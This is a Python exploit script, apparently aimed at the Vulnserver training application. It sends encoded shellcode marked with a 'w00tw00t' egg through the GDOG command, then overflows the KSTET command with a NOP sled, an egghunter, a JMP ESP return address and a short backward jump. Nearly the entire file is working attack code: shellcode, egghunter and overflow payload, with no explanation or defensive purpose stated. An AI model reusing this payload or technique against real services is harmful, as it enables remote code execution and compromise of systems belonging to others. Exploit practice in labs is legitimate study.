import socket
from struct import pack

def connect_to_server(host='172.19.204.53', port=9999):
    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Successfully connected to {host} on port {port}")

        size = 100

        egghunter = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x37\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


        buf =  b""
        buf += b"\x29\xc9\xb1\xbc\xe8\xff\xff\xff\xff\xc1\x5e\x30"
        buf += b"\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67"
        buf += b"\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98"
        buf += b"\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3"
        buf += b"\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28\xed\xc9"
        buf += b"\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe\x7a\x26"
        buf += b"\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40\x91\xc8"
        buf += b"\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b\x7f\xb0"
        buf += b"\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf\x59\x26"
        buf += b"\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41\x67\xb4"
        buf += b"\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa\x76\xf8"
        buf += b"\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24\x2e"
        buf += b"\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
        buf += b"\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10"
        buf += b"\x67\x4c\x21\x65\x92\xaf\x74\xf7\x06\x34\x1f\x3e"
        buf += b"\x5b\x70\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14"
        buf += b"\xf7\xa2\xc0\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7"
        buf += b"\xdf\xbd"

        shellcode = b"w00tw00t" + buf

        header = b"GDOG " 
        payload1 = shellcode

        exploit1 = header + payload1 
        print(f"Sent message")  

        # Example of receiving a response (if any)
        response = client_socket.recv(1024)
        if response:
            print(f"Received response: {response.decode('utf-8')}")
        else:
            print("No response received from the server.")

        client_socket.sendall(exploit1)

        header = b"KSTET "
        nopsled = b"\x90" * 10 
        payload = b"A" * (70 - len(nopsled) - len(egghunter))
        payload += pack ("<L", (0x625011af)) # JMP ESP (short JMP)
        payload += b"\xeb\xba\x90\x90" #JMP - 70
        payload += b"C" * (size - len(payload)) #put JMP - 70 (to go to A's where we will put our egghunter)



        exploit = header + nopsled + egghunter + payload

        client_socket.sendall(exploit)  # No need to encode since it's already in byte format

        print(f"Sent message")  

        # Example of receiving a response (if any)
        response = client_socket.recv(1024)
        if response:
            print(f"Received response: {response.decode('utf-8')}")
        else:
            print("No response received from the server.")

    except socket.error as e:
        print(f"Socket error: {e}")
    
    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    connect_to_server()
